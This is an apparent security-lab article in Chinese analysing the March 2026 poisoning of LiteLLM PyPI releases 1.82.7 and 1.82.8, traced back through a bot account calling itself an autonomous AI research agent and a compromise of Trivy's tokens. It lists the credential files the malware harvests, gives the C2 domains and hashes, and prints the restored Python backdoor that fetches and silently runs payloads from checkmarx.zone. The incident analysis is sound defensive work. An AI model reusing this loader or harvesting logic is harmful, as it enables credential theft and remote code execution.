---
title: 从hackerbot-claw自动化利用到LiteLLM投毒
url: https://mp.weixin.qq.com/s/3013nP4IrAOkCubxjEBCZQ
source: Doonsec's feed
date: 2026-03-25
fetch_date: 2026-03-26T04:29:56.892475
---

# 从hackerbot-claw自动化利用到LiteLLM投毒

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/RibBgJR6rjzeo7HO933Hd6IhEVRVibHl5cYt91DPhgc53ld3fUYm14Q6L0QiaCZGN8ZsUT0AaHlkrPlLGibvanCZeR2wgr1qjibqbriciaibzIVgGdg/0?wx_fmt=jpeg)

# 从hackerbot-claw自动化利用到LiteLLM投毒

原创

刁程扬
刁程扬

墨菲安全实验室

![]()

在小说阅读器中沉浸阅读

01

LiteLLM事件概述

LiteLLM 是一款热门的开源大模型网关，在 GitHub 上拥有4万+star ，用于多模型API管理和统一调用。

攻击者在2026-03-24日通过PyPI 仓库发布了投毒版本的 litellm 组件：

| 版本号 | 下载量 |
| --- | --- |
| 1.82.7 | 16930 |
| 1.82.8 | 102391 |

LiteLLM被投毒并非一次孤立的投毒事件，而是一场蓄谋已久、环环相扣的跨生态系统连环攻击。攻击者极其巧妙地利用了现代软件供应链的网状信任关系，上演了一场教科书级别的“借刀杀人”。

2月底开始，有攻击者注册了名为hackerbot-claw的GitHub机器人账号以及同名代码仓库，通过自称是基于claude-opus-4.5模型的自主安全研究agent，成功利用了多个热门开源项目的GitHub workflow漏洞（包括 aquasecurity/trivy 仓库，目前已知受影响的仓库还有：avelino/awesome-go、project-akri/akri、microsoft/ai-discovery-agent、DataDog/datadog-iac-scanner、RustPython/RustPython）。通过自动化攻击窃取了GitHub action中配置的访问令牌（PAT），并针对trivy安全扫描插件投毒（trivy是一款开源漏洞扫描工具，常用于CI阶段/容器镜像扫描）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RibBgJR6rjzdbc1FtHjj7c6TmZf0X0G6veCibOfWCwPVDRqMOXsqI4XiaT0bKeHFiaE7X81qSZMQo28R0smxD9xOa0rqLaHI1d8AarR8SRsAkPI/640?wx_fmt=png&from=appmsg)

Trivy项目在被投毒后进行加固

由于Trivy泄漏的token并未清理干净，在3月20日，名为TeamPCP的组织同样获取了Trivy的GitHub token，利用token发布了恶意的GitHub action，并随后在Trivy的dockerhub仓库发布恶意镜像。

![](https://mmbiz.qpic.cn/mmbiz_png/RibBgJR6rjzfTZ6Hwia8ktiaxNWJLyA6r32aCpibe9Awmy2dh6XqQTBheueLf4U4UlianaEqzxqXjOEqzhO8cqT65c0VYPBWDKSftichDSiapqMj78/640?wx_fmt=png&from=appmsg)

由于 LiteLLM 在 CI/CD 流程中依赖 Trivy的GitHub action进行安全扫描，攻击者可能通过被污染的 Trivy 获取构建或发布权限，从而向下游注入恶意 Payload，导致最终分发的包中出现凭证窃取代码。

![](https://mmbiz.qpic.cn/mmbiz_png/RibBgJR6rjzed8aJx0gJ7Jm1aqRa7EgMXEf2zuveeBe27lhMWphMkJcoiaFBIQXLFg2cXROBdxKMolBDEQnHSImytoLInLnUiaOm79s3T8icPBk/640?wx_fmt=png&from=appmsg)

02

投毒代码分析

攻击者在以下版本中植入了恶意代码：

* v1.82.7 ：litellm/proxy/proxy\_server.py 文件

* v1.82.8 ：litellm/proxy/proxy\_server.py 与 litellm\_init.pth 文件

当执行 import litellm.proxy.proxy\_server 或者 Python 启动加载 .pth 文件时，将触发恶意逻辑。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RibBgJR6rjzeTA88KtvnHbybr1weFMK876XLvXDGKEGAokAovSxXINZkKoS8HB6viaHXM7QvBR37bEY3Br0OJHe6NaXTng4dFS6VM2xkXd9Dk/640?wx_fmt=png&from=appmsg)

`proxy_server.py 中的恶意代码`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RibBgJR6rjzf8vJGBROmANY2utB9cML2MZia220V1kVKaKjCtf1xYJLqiatYbvtnpUEiaqYicPfddjZdBryn6NwpOlaz8rjLeaA5mMQZqaBGM2Yg/640?wx_fmt=png&from=appmsg)

`litellm_init.pth 中的恶意代码`

第一阶段：凭证窃取与数据外传脚本

此阶段大规模收集主机敏感凭证 → AES-256 + RSA 公钥加密 → 打包上传至 C2 服务器。

具体恶意行为

此阶段大规模收集主机敏感凭证 → AES-256 + RSA 公钥加密 → 打包上传至 C2 服务器。

1. 具体恶意行为

* **全面凭证枚举** ：遍历 `/home`、`/root`、`/etc`、`/var` 等目录，窃取以下各类敏感信息：
* SSH 私钥（`id_rsa`、`id_ed25519` 等）、`authorized_keys`、`config`
* 云服务凭证（AWS `credentials/config`、GCP `application_default_credentials.json`、Azure、Google）
* Kubernetes 凭证（`~/.kube/config`、ServiceAccount token、所有 Secrets）
* Docker、npm、Vault、数据库配置文件（`.my.cnf`、`.pgpass`、Redis、PostgreSQL 等）
* 加密货币钱包（Bitcoin、Ethereum、Solana、Cardano 等 keypair 文件）
* 历史记录（`.bash_history`、`.zsh_history` 等）
* 环境变量、Terraform、Helm、WireGuard 等配置文件
* **动态命令执行** ：通过 `subprocess` 运行 `env`、`kubectl get secrets`、aws API 调用、IMDSv2 元数据窃取等，实时获取临时凭证。
* **AWS 高级窃取** ：调用 Secrets Manager `ListSecrets` / `GetSecretValue`、SSM Parameter Store，获取云端秘密。
* **数据加密外传** ：
* 使用硬编码的 RSA 公钥加密 AES session key
* 将所有收集到的数据打包为 `tpcp.tar.gz` 静默 POST 上传至 `hxxps[:]//models.litellm[.]cloud/`
* **权限提升尝试** ：在 K8s 环境中创建 privileged Pod（`hostPID: true`、`hostNetwork: true`），尝试在所有节点上部署持久化后门。

第二阶段：持久化后门

此阶段伪装成系统服务，实现长期驻留 + 二次 payload 拉取执行。

具体恶意行为

* 服务伪装 ：

* 文件名伪装为 ~/.config/sysmon/sysmon.py

* 创建 systemd user 服务，描述为 “System Telemetry Service”（系统遥测服务）

* 通过 K8s privileged Pod + hostPath: / 在宿主机上自动安装该服务

* C2 通信 ：

* 启动后延迟 5 分钟，每 50 分钟从 https://checkmarx.zone/raw 获取最新 payload URL

* 使用 /tmp/.pg\_state 记录上次执行的 URL，避免重复下载

* 远程代码执行 ：

* 下载最新 payload 到 /tmp/pglog

* 赋予 755 权限，后台静默执行（subprocess.Popen + start*new*session=True）

* 过滤掉包含 youtube.com 的链接（疑似作者规避机制）

* 高权限持久化 ：依赖 K8s 节点上的 privileged 容器实现宿主机级持久化，重启后依然生效。

还原后的明文 Payload

```
import urllib.requestimport osimport subprocessimport timeC_URL = "https://checkmarx.zone/raw"TARGET = "/tmp/pglog"STATE = "/tmp/.pg_state"def g():    try:        req = urllib.request.Request(C_URL, headers={'User-Agent': 'Mozilla/5.0'})        with urllib.request.urlopen(req, timeout=10) as r:            link = r.read().decode('utf-8').strip()            return link if link.startswith("http") else None    except:        return Nonedef e(l):    try:        urllib.request.urlretrieve(l, TARGET)        os.chmod(TARGET, 0o755)        subprocess.Popen([TARGET], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)        with open(STATE, "w") as f:            f.write(l)    except:        passif __name__ == "__main__":    time.sleep(300)          # 首次启动延迟 5 分钟    while True:        l = g()              # 从 https://checkmarx.zone/raw 获取最新 payload URL        prev = ""        if os.path.exists(STATE):            try:                with open(STATE, "r") as f:                    prev = f.read().strip()            except:                pass        # 如果拿到新链接，且不是 youtube.com，则下载并执行        if l and l != prev and "youtube.com" not in l:            e(l)        time.sleep(3000)     # 每 50 分钟检查一次
```

03

IOC

外连地址

* models.litellm.cloud

* checkmarx.zone

恶意文件哈希

* litellm\_init.pth

sha256: 71e35aef03099cd1f2d6446734273025a163597de93912df321ef118bf135238

* proxy\_server.py

sha256: a0d229be8efcb2f9135e2ad55ba275b76ddcfeb55fa4370e0a522a5bdee0120b

04

总结

从 hackerbot-claw 对 GitHub Actions 的自动化利用，到 Trivy 供应链被TeamPCP二次投毒，再到 LiteLLM 发布链路中出现恶意包，这起事件说明当前开源生态面临的威胁早已不再是单一组件受影响，而是攻击者围绕 CI/CD、访问令牌、构建产物和下游依赖之间的信任关系进行横向渗透与逐级放大。

对企业而言，真正需要关注的不只是“是否安装了恶意版本”，更要重新审视组件依赖关系、第三方构建依赖与镜像来源可信性、构建发布环境隔离、凭证轮换以及产物完整性校验机制；否则，一次上游凭证泄漏，就足以沿着自动化流水线演变成大范围的供应链灾难。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/GGZ6E0yTPjtQOFa9uWkOJOOPNMkOyXEwCH5XQicGHiambXibIicWwJuxA1Vk1Tv4zeibXoYlIk7Bric8AJjscDRVLkdg/0?wx_fmt=png)

墨菲安全实验室

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/GGZ6E0yTPjtQOFa9uWkOJOOPNMkOyXEwCH5XQicGHiambXibIicWwJuxA1Vk1Tv4zeibXoYlIk7Bric8AJjscDRVLkdg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过